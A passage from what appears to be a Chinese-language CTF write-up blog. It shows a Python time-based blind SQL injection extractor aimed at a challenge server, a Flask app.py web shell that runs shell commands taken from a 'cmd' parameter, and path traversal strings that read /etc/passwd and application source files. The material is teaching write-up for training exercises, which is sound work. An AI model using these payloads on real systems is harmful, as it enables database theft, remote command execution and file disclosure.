data-num="54"></td><td><pre>        <span class="token keyword">return</span> s1</pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">ascii_equal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> asc<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>asc<span class="token punctuation">&#125;</span></span><span class="token string">)in(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">))"</span></span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">return</span> s1</pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">len_equal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> length<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string">)in(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">))"</span></span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token keyword">return</span> s1</pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">ascii_greater</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> asc<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(leAst(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>asc<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)in(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">))"</span></span></pre></td></tr><tr><td data-num="66"></td><td><pre>        <span class="token keyword">return</span> s1</pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cond<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        s2 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Elt((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cond<span class="token punctuation">&#125;</span></span><span class="token string">)+1,sLeep(1),0)"</span></span></pre></td></tr><tr><td data-num="70"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(iF((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cond<span class="token punctuation">&#125;</span></span><span class="token string">),sLeep(1),0))"</span></span></pre></td></tr><tr><td data-num="71"></td><td><pre>        <span class="token keyword">return</span> s1</pre></td></tr><tr><td data-num="72"></td><td><pre></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Injector</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> method<span class="token punctuation">,</span> inject_param<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url</pre></td></tr><tr><td data-num="77"></td><td><pre>        self<span class="token punctuation">.</span>method <span class="token operator">=</span> method</pre></td></tr><tr><td data-num="78"></td><td><pre>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> data</pre></td></tr><tr><td data-num="79"></td><td><pre>        self<span class="token punctuation">.</span>inject_param <span class="token operator">=</span> inject_param</pre></td></tr><tr><td data-num="80"></td><td><pre>        self<span class="token punctuation">.</span>debug <span class="token operator">=</span> debug</pre></td></tr><tr><td data-num="81"></td><td><pre>        self<span class="token punctuation">.</span>gadget <span class="token operator">=</span> Gadget<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">condition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="85"></td><td><pre>            <span class="token keyword">return</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">handle_value</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> function<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        result <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        data <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>        <span class="token keyword">for</span> _time <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="92"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"time:%d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>_time <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>            left <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="94"></td><td><pre>            right <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="95"></td><td><pre>            updated <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="96"></td><td><pre>            <span class="token keyword">while</span> right <span class="token operator">></span> left<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="98"></td><td><pre>                <span class="token keyword">with</span> self<span class="token punctuation">.</span>gadget <span class="token keyword">as</span> g<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="99"></td><td><pre>                    data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>inject_param<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>inject_param<span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'XXXXX'</span><span class="token punctuation">,</span> g<span class="token punctuation">.</span>judge<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="100"></td><td><pre>                        g<span class="token punctuation">.</span>ascii_equal<span class="token punctuation">(</span>g<span class="token punctuation">.</span>get_char_ascii<span class="token punctuation">(</span>function<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span> _time <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre>                res <span class="token operator">=</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="102"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="103"></td><td><pre>                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>                    <span class="token keyword">if</span> self<span class="token punctuation">.</span>debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="105"></td><td><pre>                        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="106"></td><td><pre>                        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="108"></td><td><pre>                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="109"></td><td><pre>                    <span class="token keyword">if</span> self<span class="token punctuation">.</span>debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="110"></td><td><pre>                        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>condition<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="112"></td><td><pre>                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="113"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre>                    updated <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="115"></td><td><pre>                    <span class="token keyword">break</span></pre></td></tr><tr><td data-num="116"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="117"></td><td><pre>                    <span class="token keyword">with</span> self<span class="token punctuation">.</span>gadget <span class="token keyword">as</span> g<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="118"></td><td><pre>                        data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>inject_param<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>inject_param<span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'XXXXX'</span><span class="token punctuation">,</span> g<span class="token punctuation">.</span>judge<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="119"></td><td><pre>                            g<span class="token punctuation">.</span>ascii_greater<span class="token punctuation">(</span>g<span class="token punctuation">.</span>get_char_ascii<span class="token punctuation">(</span>function<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span> _time <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="120"></td><td><pre>                res <span class="token operator">=</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="121"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="122"></td><td><pre>                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="123"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="124"></td><td><pre>                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="126"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="127"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>condition<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="128"></td><td><pre>                    left <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="129"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="130"></td><td><pre>                    right <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="131"></td><td><pre>            <span class="token keyword">if</span> <span class="token keyword">not</span> updated<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="132"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="133"></td><td><pre></pre></td></tr><tr><td data-num="134"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">handle_len</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> function<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="135"></td><td><pre>        data <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="136"></td><td><pre>        <span class="token keyword">for</span> _time <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="137"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"time:%d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>_time<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="138"></td><td><pre>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>gadget <span class="token keyword">as</span> g<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="139"></td><td><pre>                data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>inject_param<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>inject_param<span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'XXXXX'</span><span class="token punctuation">,</span> g<span class="token punctuation">.</span>judge<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="140"></td><td><pre>                    g<span class="token punctuation">.</span>len_equal<span class="token punctuation">(</span>g<span class="token punctuation">.</span>get_len<span class="token punctuation">(</span>function<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span> _time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="141"></td><td><pre>            res <span class="token operator">=</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="142"></td><td><pre>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="143"></td><td><pre>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="144"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="145"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="146"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="148"></td><td><pre>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="149"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="150"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>condition<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="152"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span>_time<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="153"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="154"></td><td><pre></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="157"></td><td><pre>    g <span class="token operator">=</span> Gadget<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="158"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="159"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'http://22efcf95-b1f0-43bb-ae25-a76d1371153b.node4.buuoj.cn:81/'</span></pre></td></tr><tr><td data-num="160"></td><td><pre>    inject_param <span class="token operator">=</span> <span class="token string">'id'</span></pre></td></tr><tr><td data-num="161"></td><td><pre>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">"1/**/Or/**/XXXXX#"</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>    inj <span class="token operator">=</span> Injector<span class="token punctuation">(</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'get'</span><span class="token punctuation">,</span> inject_param<span class="token operator">=</span>inject_param<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="163"></td><td><pre></pre></td></tr><tr><td data-num="164"></td><td><pre>    <span class="token comment"># 获取数据库列表</span></pre></td></tr><tr><td data-num="165"></td><td><pre>    <span class="token comment"># inj.handle_value(g.db_names)</span></pre></td></tr><tr><td data-num="166"></td><td><pre>    <span class="token comment"># information_schema, mysql, performance_schema, sys, test, ctf</span></pre></td></tr><tr><td data-num="167"></td><td><pre></pre></td></tr><tr><td data-num="168"></td><td><pre>    <span class="token comment"># 根据数据库获取表名</span></pre></td></tr><tr><td data-num="169"></td><td><pre>    <span class="token comment"># inj.handle_value(g.table_name_in_db2, 'ctf')</span></pre></td></tr><tr><td data-num="170"></td><td><pre>    <span class="token comment"># items</span></pre></td></tr><tr><td data-num="171"></td><td><pre></pre></td></tr><tr><td data-num="172"></td><td><pre>    <span class="token comment"># 获取表的字段</span></pre></td></tr><tr><td data-num="173"></td><td><pre>    <span class="token comment"># inj.handle_value(g.column_name_in_table, 'items')</span></pre></td></tr><tr><td data-num="174"></td><td><pre>    <span class="token comment"># id, name, price</span></pre></td></tr><tr><td data-num="175"></td><td><pre></pre></td></tr><tr><td data-num="176"></td><td><pre>    <span class="token comment"># 最后取数据</span></pre></td></tr><tr><td data-num="177"></td><td><pre>    inj<span class="token punctuation">.</span>handle_value<span class="token punctuation">(</span>g<span class="token punctuation">.</span>column_value_in_table<span class="token punctuation">,</span> <span class="token string">'ctf.items'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="flask-disk"><a class="anchor" href="#flask-disk">#</a> flask disk</h3><p>做之前可以看下这篇文章了解下 flask 的 debug 模式。</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk3NjAy">从一道 ctf 题谈谈 flask 开启 debug 模式存在的安全问题</span></p><p>访问 admin manage 发现要输入 pin 码，说明 flask 开启了 debug 模式。</p><p>flask 开启了 debug 模式下，app.py 源文件被修改后会立刻加载。</p><p>所以只需要上传一个能 rce 的 app.py 文件把原来的覆盖，就可以了。注意语法不能出错，否则会崩溃。</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#app.py</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="4"></td><td><pre>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        data <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">return</span> data</pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">"1"</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="injectme"><a class="anchor" href="#injectme">#</a> InjectMe</h3><p>目录穿越 + session 伪造 + SSTI bypass</p><p>这题目我的评价是真不错。</p><p>首先进入题目是一张图片，点击图片可进入 /cancanneed 目录，内容如下：</p><p>['.DS_Store', '1.jpg', '10.jpg', '11.jpg', '110.jpg', '3.jpg', '4.jpg', '5.jpg', '6.jpg', '7.jpg', '8.jpg', '9.jpg']<br><span class="exturl" data-url="aHR0cDovLzk4MzcwOTQyLTEzMDYtNGFjNi1hNjc3LTMxYTM3NTQ3OTEyZC5ub2RlNC5idXVvai5jbjo4MS9jYW5jYW5uZWVkP2ZpbGU9MS5qcGc=">/cancanneed?file=1.jpg</span></p><p>点击 /cancanneed?file=1.jpg，进入后发现：<span class="exturl" data-url="aHR0cDovLzk4MzcwOTQyLTEzMDYtNGFjNi1hNjc3LTMxYTM3NTQ3OTEyZC5ub2RlNC5idXVvai5jbjo4MS9kb3dubG9hZD9maWxlPTEuanBn">download 1.jpg</span></p><p>图片可以下载，观察到 url 变为了 /download?file=1.jpg</p><p>很明显有敏感文件泄露，尝试一番后无果，应该是因为有过滤的原因，那就看看它给的其它图片里有啥，最终在 110.jpg 中看到提示：</p><p><img data-src="../../../images/Iknowyouwillstop/110.jpg" alt="110"></p><p>可以看到对传递进来的 file 参数进行了../ 单次替换，然后拼接，最后下载文件，由于只进行了一次替换成空，所以可以绕过，下面提供一种方式，然后加上 dockerfile 泄露的目录，可以猜到运行文件，以及后面审计源码，发现 config 文件：</p><blockquote><p>..././..././..././etc/passwd</p><p>..././..././..././app/app.py</p><p>..././..././..././app/config.py</p></blockquote><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#app.py</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> config <span class="token keyword">import</span> secret_key</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># put application's code here</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/cancanneed"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">cancanneed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    all_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'img.html'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">,</span> all_filename<span class="token operator">=</span>all_filename<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 